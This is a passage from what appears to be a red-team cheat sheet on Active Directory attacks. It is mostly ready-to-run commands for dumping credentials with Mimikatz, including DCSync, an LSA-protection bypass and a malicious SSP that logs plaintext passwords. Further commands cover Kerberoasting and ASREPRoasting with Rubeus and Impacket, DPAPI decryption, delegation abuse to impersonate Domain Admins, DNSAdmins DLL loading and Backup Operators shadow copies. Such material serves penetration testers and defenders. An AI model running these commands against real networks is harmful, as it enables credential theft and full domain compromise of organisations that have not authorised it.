</span></span><span class=line><span class=cl>mimikatz sekurlsa::ekeys
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Dump SAM Database
</span></span><span class=line><span class=cl>mimikatz lsadump::sam
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Dump SECRETS Database
</span></span><span class=line><span class=cl>mimikatz lsadump::secrets
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Inject and dump the Domain Controler&#39;s Credentials
</span></span><span class=line><span class=cl>mimikatz privilege::debug
</span></span><span class=line><span class=cl>mimikatz token::elevate
</span></span><span class=line><span class=cl>mimikatz lsadump::lsa /inject
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Dump the Domain&#39;s Credentials without touching DC&#39;s LSASS and also remotely
</span></span><span class=line><span class=cl>mimikatz lsadump::dcsync /domain:&lt;DomainFQDN&gt; /all
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#List and Dump local kerberos credentials
</span></span><span class=line><span class=cl>mimikatz kerberos::list /dump
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Pass The Ticket
</span></span><span class=line><span class=cl>mimikatz kerberos::ptt &lt;PathToKirbiFile&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#List TS/RDP sessions
</span></span><span class=line><span class=cl>mimikatz ts::sessions
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#List Vault credentials
</span></span><span class=line><span class=cl>mimikatz vault::list</span></span></code></pre></div></div><p>&#x2757; What if mimikatz fails to dump credentials because of LSA Protection controls ? \</p><ul><li>LSA as a Protected Process (Kernel Land Bypass)</li></ul><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#Check if LSA runs as a protected process by looking if the variable &#34;RunAsPPL&#34; is set to 0x1
</span></span><span class=line><span class=cl>reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe
</span></span><span class=line><span class=cl>#Now lets import the mimidriver.sys to the system
</span></span><span class=line><span class=cl>mimikatz # !+
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Now lets remove the protection flags from lsass.exe process
</span></span><span class=line><span class=cl>mimikatz # !processprotect /process:lsass.exe /remove
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Finally run the logonpasswords function to dump lsass
</span></span><span class=line><span class=cl>mimikatz # sekurlsa::logonpasswords</span></span></code></pre></div></div><ul><li><p>LSA as a Protected Process (Userland Land &ldquo;Fileless&rdquo; Bypass)</p><ul><li><a href=https://github.com/itm4n/PPLdump target=_blank rel=noreferrer>PPLdump</a></li><li><a href=https://blog.scrt.ch/2021/04/22/bypassing-lsa-protection-in-userland target=_blank rel=noreferrer>Bypassing LSA Protection in Userland</a></li></ul></li><li><p>LSA is running as virtualized process (LSAISO) by Credential Guard</p></li></ul><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#Check if a process called lsaiso.exe exists on the running processes
</span></span><span class=line><span class=cl>tasklist |findstr lsaiso
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#If it does there isn&#39;t a way tou dump lsass, we will only get encrypted data. But we can still use keyloggers or clipboard dumpers to capture data.
</span></span><span class=line><span class=cl>#Lets inject our own malicious Security Support Provider into memory, for this example i&#39;ll use the one mimikatz provides
</span></span><span class=line><span class=cl>mimikatz # misc::memssp
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\windows\system32\mimilsa.log</span></span></code></pre></div></div><ul><li><a href="https://adsecurity.org/?page_id=1821" target=_blank rel=noreferrer>Detailed Mimikatz Guide</a></li><li><a href=https://medium.com/red-teaming-with-a-blue-team-mentaility/poking-around-with-2-lsass-protection-options-880590a72b1a target=_blank rel=noreferrer>Poking Around With 2 lsass Protection Options</a></li></ul><h3 class="relative group">Useful Tools<div id=useful-tools class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#useful-tools aria-label=Anchor>#</a></span></h3><ul><li><a href=https://github.com/besimorhino/powercat target=_blank rel=noreferrer>Powercat</a> netcat written in powershell, and provides tunneling, relay and portforward
capabilities.</li><li><a href=https://github.com/Mr-Un1k0d3r/SCShell target=_blank rel=noreferrer>SCShell</a> fileless lateral movement tool that relies on ChangeServiceConfigA to run command</li><li><a href=https://github.com/Hackplayers/evil-winrm target=_blank rel=noreferrer>Evil-Winrm</a> the ultimate WinRM shell for hacking/pentesting</li><li><a href=https://github.com/antonioCoco/RunasCs target=_blank rel=noreferrer>RunasCs</a> Csharp and open version of windows builtin runas.exe</li></ul><h2 class="relative group">Domain Privilege Escalation<div id=domain-privilege-escalation class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#domain-privilege-escalation aria-label=Anchor>#</a></span></h2><h3 class="relative group">Kerberoast<div id=kerberoast class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#kerberoast aria-label=Anchor>#</a></span></h3><p><em>WUT IS DIS?:</em><br>All standard domain users can request a copy of all service accounts along with their correlating password hashes, so we can ask a TGS for any SPN that is bound to a &ldquo;user&rdquo;<br>account, extract the encrypted blob that was encrypted using the user&rsquo;s password and bruteforce it offline.</p><ul><li>PowerView:</li></ul><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#Get User Accounts that are used as Service Accounts
</span></span><span class=line><span class=cl>Get-NetUser -SPN
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Get every available SPN account, request a TGS and dump its hash
</span></span><span class=line><span class=cl>Invoke-Kerberoast
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Requesting the TGS for a single account:
</span></span><span class=line><span class=cl>Request-SPNTicket
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>#Export all tickets using Mimikatz
</span></span><span class=line><span class=cl>Invoke-Mimikatz -Command &#39;&#34;kerberos::list /export&#34;&#39;</span></span></code></pre></div></div><ul><li>AD Module:</li></ul><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#Get User Accounts that are used as Service Accounts
</span></span><span class=line><span class=cl>Get-ADUser -Filter {ServicePrincipalName -ne &#34;$null&#34;} -Properties ServicePrincipalName</span></span></code></pre></div></div><ul><li>Impacket:</li></ul><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>python GetUserSPNs.py &lt;DomainName&gt;/&lt;DomainUser&gt;:&lt;Password&gt; -outputfile &lt;FileName&gt;</span></span></code></pre></div></div><ul><li>Rubeus:</li></ul><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#Kerberoasting and outputing on a file with a spesific format
</span></span><span class=line><span class=cl>Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Kerberoasting whle being &#34;OPSEC&#34; safe, essentially while not try to roast AES enabled accounts
</span></span><span class=line><span class=cl>Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /rc4opsec
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Kerberoast AES enabled accounts
</span></span><span class=line><span class=cl>Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /aes
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>#Kerberoast spesific user account
</span></span><span class=line><span class=cl>Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /user:&lt;username&gt; /simple
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Kerberoast by specifying the authentication credentials 
</span></span><span class=line><span class=cl>Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /creduser:&lt;username&gt; /credpassword:&lt;password&gt;</span></span></code></pre></div></div><h3 class="relative group">ASREPRoast<div id=asreproast class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#asreproast aria-label=Anchor>#</a></span></h3><p><em>WUT IS DIS?:</em><br>If a domain user account do not require kerberos preauthentication, we can request a valid TGT for this account without even having domain credentials, extract the encrypted<br>blob and bruteforce it offline.</p><ul><li>PowerView: <code>Get-DomainUser -PreauthNotRequired -Verbose</code></li><li>AD Module: <code>Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth</code></li></ul><p>Forcefully Disable Kerberos Preauth on an account i have Write Permissions or more!
Check for interesting permissions on accounts:</p><p><strong>Hint:</strong> We add a filter e.g. RDPUsers to get &ldquo;User Accounts&rdquo; not Machine Accounts, because Machine Account hashes are not crackable!</p><p>PowerView:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match &#34;RDPUsers&#34;}
</span></span><span class=line><span class=cl>Disable Kerberos Preauth:
</span></span><span class=line><span class=cl>Set-DomainObject -Identity &lt;UserAccount&gt; -XOR @{useraccountcontrol=4194304} -Verbose
</span></span><span class=line><span class=cl>Check if the value changed:
</span></span><span class=line><span class=cl>Get-DomainUser -PreauthNotRequired -Verbose</span></span></code></pre></div></div><p>And finally execute the attack using the <a href=https://github.com/HarmJ0y/ASREPRoast target=_blank rel=noreferrer>ASREPRoast</a> tool.</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#Get a spesific Accounts hash:
</span></span><span class=line><span class=cl>Get-ASREPHash -UserName &lt;UserName&gt; -Verbose
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Get any ASREPRoastable Users hashes:
</span></span><span class=line><span class=cl>Invoke-ASREPRoast -Verbose</span></span></code></pre></div></div><p>Using Rubeus:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#Trying the attack for all domain users
</span></span><span class=line><span class=cl>Rubeus.exe asreproast /format:&lt;hashcat|john&gt; /domain:&lt;DomainName&gt; /outfile:&lt;filename&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#ASREPRoast spesific user
</span></span><span class=line><span class=cl>Rubeus.exe asreproast /user:&lt;username&gt; /format:&lt;hashcat|john&gt; /domain:&lt;DomainName&gt; /outfile:&lt;filename&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#ASREPRoast users of a spesific OU (Organization Unit)
</span></span><span class=line><span class=cl>Rubeus.exe asreproast /ou:&lt;OUName&gt; /format:&lt;hashcat|john&gt; /domain:&lt;DomainName&gt; /outfile:&lt;filename&gt;</span></span></code></pre></div></div><p>Using Impacket:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#Trying the attack for the specified users on the file
</span></span><span class=line><span class=cl>python GetNPUsers.py &lt;domain_name&gt;/ -usersfile &lt;users_file&gt; -outputfile &lt;FileName&gt;</span></span></code></pre></div></div><h3 class="relative group">Password Spray Attack<div id=password-spray-attack class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#password-spray-attack aria-label=Anchor>#</a></span></h3><p>If we have harvest some passwords by compromising a user account, we can use this method to try and exploit password reuse
on other domain accounts.</p><p><strong>Tools:</strong></p><ul><li><a href=https://github.com/dafthack/DomainPasswordSpray target=_blank rel=noreferrer>DomainPasswordSpray</a></li><li><a href=https://github.com/byt3bl33d3r/CrackMapExec target=_blank rel=noreferrer>CrackMapExec</a></li><li><a href=https://github.com/wavestone-cdt/Invoke-CleverSpray target=_blank rel=noreferrer>Invoke-CleverSpray</a></li><li><a href=https://github.com/Greenwolf/Spray target=_blank rel=noreferrer>Spray</a></li></ul><h3 class="relative group">Force Set SPN<div id=force-set-spn class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#force-set-spn aria-label=Anchor>#</a></span></h3><p><em>WUT IS DIS ?:
If we have enough permissions -> GenericAll/GenericWrite we can set a SPN on a target account, request a TGS, then grab its blob and bruteforce it.</em></p><ul><li>PowerView:</li></ul><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#Check for interesting permissions on accounts:
</span></span><span class=line><span class=cl>Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match &#34;RDPUsers&#34;}
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>#Check if current user has already an SPN setted:
</span></span><span class=line><span class=cl>Get-DomainUser -Identity &lt;UserName&gt; | select serviceprincipalname
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>#Force set the SPN on the account:
</span></span><span class=line><span class=cl>Set-DomainObject &lt;UserName&gt; -Set @{serviceprincipalname=&#39;ops/whatever1&#39;}</span></span></code></pre></div></div><ul><li>AD Module:</li></ul><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#Check if current user has already an SPN setted
</span></span><span class=line><span class=cl>Get-ADUser -Identity &lt;UserName&gt; -Properties ServicePrincipalName | select ServicePrincipalName
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>#Force set the SPN on the account:
</span></span><span class=line><span class=cl>Set-ADUser -Identiny &lt;UserName&gt; -ServicePrincipalNames @{Add=&#39;ops/whatever1&#39;}</span></span></code></pre></div></div><p>Finally use any tool from before to grab the hash and kerberoast it!</p><h3 class="relative group">Abusing Shadow Copies<div id=abusing-shadow-copies class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#abusing-shadow-copies aria-label=Anchor>#</a></span></h3><p>If you have local administrator access on a machine try to list shadow copies, it&rsquo;s an easy way for Domain Escalation.</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#List shadow copies using vssadmin (Needs Admnistrator Access)
</span></span><span class=line><span class=cl>vssadmin list shadows
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>#List shadow copies using diskshadow
</span></span><span class=line><span class=cl>diskshadow list shadows all
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>#Make a symlink to the shadow copy and access it
</span></span><span class=line><span class=cl>mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\</span></span></code></pre></div></div><ol><li>You can dump the backuped SAM database and harvest credentials.</li><li>Look for DPAPI stored creds and decrypt them.</li><li>Access backuped sensitive files.</li></ol><h3 class="relative group">List and Decrypt Stored Credentials using Mimikatz<div id=list-and-decrypt-stored-credentials-using-mimikatz class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#list-and-decrypt-stored-credentials-using-mimikatz aria-label=Anchor>#</a></span></h3><p>Usually encrypted credentials are stored in:</p><ul><li><code>%appdata%\Microsoft\Credentials</code></li><li><code>%localappdata%\Microsoft\Credentials</code></li></ul><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#By using the cred function of mimikatz we can enumerate the cred object and get information about it:
</span></span><span class=line><span class=cl>dpapi::cred /in:&#34;%appdata%\Microsoft\Credentials\&lt;CredHash&gt;&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#From the previous command we are interested to the &#34;guidMasterKey&#34; parameter, that tells us which masterkey was used to encrypt the credential
</span></span><span class=line><span class=cl>#Lets enumerate the Master Key:
</span></span><span class=line><span class=cl>dpapi::masterkey /in:&#34;%appdata%\Microsoft\Protect\&lt;usersid&gt;\&lt;MasterKeyGUID&gt;&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Now if we are on the context of the user (or system) that the credential belogs to, we can use the /rpc flag to pass the decryption of the masterkey to the domain controler:
</span></span><span class=line><span class=cl>dpapi::masterkey /in:&#34;%appdata%\Microsoft\Protect\&lt;usersid&gt;\&lt;MasterKeyGUID&gt;&#34; /rpc
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#We now have the masterkey in our local cache:
</span></span><span class=line><span class=cl>dpapi::cache
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Finally we can decrypt the credential using the cached masterkey:
</span></span><span class=line><span class=cl>dpapi::cred /in:&#34;%appdata%\Microsoft\Credentials\&lt;CredHash&gt;&#34;</span></span></code></pre></div></div><p>Detailed Article:
<a href=https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials target=_blank rel=noreferrer>DPAPI all the things</a></p><h3 class="relative group">Unconstrained Delegation<div id=unconstrained-delegation class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#unconstrained-delegation aria-label=Anchor>#</a></span></h3><p><em>WUT IS DIS ?: If we have Administrative access on a machine that has Unconstrained Delegation enabled, we can wait for a
high value target or DA to connect to it, steal his TGT then ptt and impersonate him!</em></p><p>Using PowerView:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#Discover domain joined computers that have Unconstrained Delegation enabled
</span></span><span class=line><span class=cl>Get-NetComputer -UnConstrained
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#List tickets and check if a DA or some High Value target has stored its TGT
</span></span><span class=line><span class=cl>Invoke-Mimikatz -Command &#39;&#34;sekurlsa::tickets&#34;&#39;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Command to monitor any incoming sessions on our compromised server
</span></span><span class=line><span class=cl>Invoke-UserHunter -ComputerName &lt;NameOfTheComputer&gt; -Poll &lt;TimeOfMonitoringInSeconds&gt; -UserName &lt;UserToMonitorFor&gt; -Delay   
</span></span><span class=line><span class=cl>&lt;WaitInterval&gt; -Verbose
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Dump the tickets to disk:
</span></span><span class=line><span class=cl>Invoke-Mimikatz -Command &#39;&#34;sekurlsa::tickets /export&#34;&#39;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Impersonate the user using ptt attack:
</span></span><span class=line><span class=cl>Invoke-Mimikatz -Command &#39;&#34;kerberos::ptt &lt;PathToTicket&gt;&#34;&#39;</span></span></code></pre></div></div><p><strong>Note:</strong> We can also use Rubeus!</p><h3 class="relative group">Constrained Delegation<div id=constrained-delegation class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#constrained-delegation aria-label=Anchor>#</a></span></h3><p>Using PowerView and Kekeo:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#Enumerate Users and Computers with constrained delegation
</span></span><span class=line><span class=cl>Get-DomainUser -TrustedToAuth
</span></span><span class=line><span class=cl>Get-DomainComputer -TrustedToAuth
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#If we have a user that has Constrained delegation, we ask for a valid tgt of this user using kekeo
</span></span><span class=line><span class=cl>tgt::ask /user:&lt;UserName&gt; /domain:&lt;Domain&#39;s FQDN&gt; /rc4:&lt;hashedPasswordOfTheUser&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Then using the TGT we have ask a TGS for a Service this user has Access to through constrained delegation
</span></span><span class=line><span class=cl>tgs::s4u /tgt:&lt;PathToTGT&gt; /user:&lt;UserToImpersonate&gt;@&lt;Domain&#39;s FQDN&gt; /service:&lt;Service&#39;s SPN&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Finally use mimikatz to ptt the TGS
</span></span><span class=line><span class=cl>Invoke-Mimikatz -Command &#39;&#34;kerberos::ptt &lt;PathToTGS&gt;&#34;&#39;</span></span></code></pre></div></div><p><em>ALTERNATIVE:</em>
Using Rubeus:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Rubeus.exe s4u /user:&lt;UserName&gt; /rc4:&lt;NTLMhashedPasswordOfTheUser&gt; /impersonateuser:&lt;UserToImpersonate&gt; /msdsspn:&#34;&lt;Service&#39;s SPN&gt;&#34; /altservice:&lt;Optional&gt; /ptt</span></span></code></pre></div></div><p>Now we can access the service as the impersonated user!</p><p>&#x1f6a9; <strong>What if we have delegation rights for only a spesific SPN? (e.g TIME):</strong></p><p>In this case we can still abuse a feature of kerberos called &ldquo;alternative service&rdquo;. This allows us to request TGS tickets for other &ldquo;alternative&rdquo; services and not only for the one we have rights for. Thats gives us the leverage to request valid tickets for any service we want that the host supports, giving us full access over the target machine.</p><h3 class="relative group">Resource Based Constrained Delegation<div id=resource-based-constrained-delegation class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#resource-based-constrained-delegation aria-label=Anchor>#</a></span></h3><p><em>WUT IS DIS?:<br>TL;DR<br>If we have GenericALL/GenericWrite privileges on a machine account object of a domain, we can abuse it and impersonate ourselves as any user of the domain to it. For example we can impersonate Domain Administrator and have complete access.</em></p><p>Tools we are going to use:</p><ul><li><a href=https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon target=_blank rel=noreferrer>PowerView</a></li><li><a href=https://github.com/Kevin-Robertson/Powermad target=_blank rel=noreferrer>Powermad</a></li><li><a href=https://github.com/GhostPack/Rubeus target=_blank rel=noreferrer>Rubeus</a></li></ul><p>First we need to enter the security context of the user/machine account that has the privileges over the object.
If it is a user account we can use Pass the Hash, RDP, PSCredentials etc.</p><p>Exploitation Example:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#Import Powermad and use it to create a new MACHINE ACCOUNT
</span></span><span class=line><span class=cl>. .\Powermad.ps1
</span></span><span class=line><span class=cl>New-MachineAccount -MachineAccount &lt;MachineAccountName&gt; -Password $(ConvertTo-SecureString &#39;p@ssword!&#39; -AsPlainText -Force) -Verbose
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Import PowerView and get the SID of our new created machine account
</span></span><span class=line><span class=cl>. .\PowerView.ps1
</span></span><span class=line><span class=cl>$ComputerSid = Get-DomainComputer &lt;MachineAccountName&gt; -Properties objectsid | Select -Expand objectsid
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Then by using the SID we are going to build an ACE for the new created machine account using a raw security descriptor:
</span></span><span class=line><span class=cl>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))&#34;
</span></span><span class=line><span class=cl>$SDBytes = New-Object byte[] ($SD.BinaryLength) 
</span></span><span class=line><span class=cl>$SD.GetBinaryForm($SDBytes, 0)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Next, we need to set the security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we&#39;re taking over, again using PowerView
</span></span><span class=line><span class=cl>Get-DomainComputer TargetMachine | Set-DomainObject -Set @{&#39;msds-allowedtoactonbehalfofotheridentity&#39;=$SDBytes} -Verbose
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#After that we need to get the RC4 hash of the new machine account&#39;s password using Rubeus
</span></span><span class=line><span class=cl>Rubeus.exe hash /password:&#39;p@ssword!&#39;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#And for this example, we are going to impersonate Domain Administrator on the cifs service of the target computer using Rubeus
</span></span><span class=line><span class=cl>Rubeus.exe s4u /user:&lt;MachineAccountName&gt; /rc4:&lt;RC4HashOfMachineAccountPassword&gt; /impersonateuser:Administrator /msdsspn:cifs/TargetMachine.wtver.domain /domain:wtver.domain /ptt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Finally we can access the C$ drive of the target machine
</span></span><span class=line><span class=cl>dir \\TargetMachine.wtver.domain\C$</span></span></code></pre></div></div><p>Detailed Articles:</p><ul><li><a href=https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html target=_blank rel=noreferrer>Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory</a></li><li><a href=https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/ target=_blank rel=noreferrer>RESOURCE-BASED CONSTRAINED DELEGATION ABUSE</a></li></ul><p>&#x2757; In Constrain and Resource-Based Constrained Delegation if we don&rsquo;t have the password/hash of the account with TRUSTED_TO_AUTH_FOR_DELEGATION that we try to abuse, we can use the very nice trick &ldquo;tgt::deleg&rdquo; from kekeo or &ldquo;tgtdeleg&rdquo; from rubeus and fool Kerberos to give us a valid TGT for that account. Then we just use the ticket instead of the hash of the account to perform the attack.</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#Command on Rubeus
</span></span><span class=line><span class=cl>Rubeus.exe tgtdeleg /nowrap</span></span></code></pre></div></div><p>Detailed Article:
<a href=https://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/ target=_blank rel=noreferrer>Rubeus  Now With More Kekeo</a></p><h3 class="relative group">DNSAdmins Abuse<div id=dnsadmins-abuse class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#dnsadmins-abuse aria-label=Anchor>#</a></span></h3><p><em>WUT IS DIS ?: If a user is a member of the DNSAdmins group, he can possibly load an arbitary DLL with the privileges of dns.exe that runs as SYSTEM. In case the DC serves a DNS, the user can escalate his privileges to DA. This exploitation process needs privileges to restart the DNS service to work.</em></p><ol><li>Enumerate the members of the DNSAdmins group:<ul><li>PowerView: <code>Get-NetGroupMember -GroupName "DNSAdmins"</code></li><li>AD Module: <code>Get-ADGroupMember -Identiny DNSAdmins</code></li></ul></li><li>Once we found a member of this group we need to compromise it (There are many ways).</li><li>Then by serving a malicious DLL on a SMB share and configuring the dll usage,we can escalate our privileges:<div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#Using dnscmd:
</span></span><span class=line><span class=cl>dnscmd &lt;NameOfDNSMAchine&gt; /config /serverlevelplugindll \\Path\To\Our\Dll\malicious.dll
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Restart the DNS Service:
</span></span><span class=line><span class=cl>sc \\DNSServer stop dns
</span></span><span class=line><span class=cl>sc \\DNSServer start dns</span></span></code></pre></div></div></li></ol><h3 class="relative group">Abusing Active Directory-Integraded DNS<div id=abusing-active-directory-integraded-dns class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#abusing-active-directory-integraded-dns aria-label=Anchor>#</a></span></h3><ul><li><a href=https://blog.netspi.com/exploiting-adidns/ target=_blank rel=noreferrer>Exploiting Active Directory-Integrated DNS</a></li><li><a href=https://blog.netspi.com/adidns-revisited/ target=_blank rel=noreferrer>ADIDNS Revisited</a></li><li><a href=https://github.com/Kevin-Robertson/Inveigh target=_blank rel=noreferrer>Inveigh</a></li></ul><h3 class="relative group">Abusing Backup Operators Group<div id=abusing-backup-operators-group class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#abusing-backup-operators-group aria-label=Anchor>#</a></span></h3><p><em>WUT IS DIS ?: If we manage to compromise a user account that is member of the Backup Operators
group, we can then abuse it&rsquo;s SeBackupPrivilege to create a shadow copy of the current state of the DC,
extract the ntds.dit database file, dump the hashes and escalate our privileges to DA.</em></p><ol><li>Once we have access on an account that has the SeBackupPrivilege we can access the DC and create a shadow copy using the signed binary diskshadow:</li></ol><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#Create a .txt file that will contain the shadow copy process script
</span></span><span class=line><span class=cl>Script -&gt;{
</span></span><span class=line><span class=cl>set context persistent nowriters  
</span></span><span class=line><span class=cl>set metadata c:\windows\system32\spool\drivers\color\example.cab  
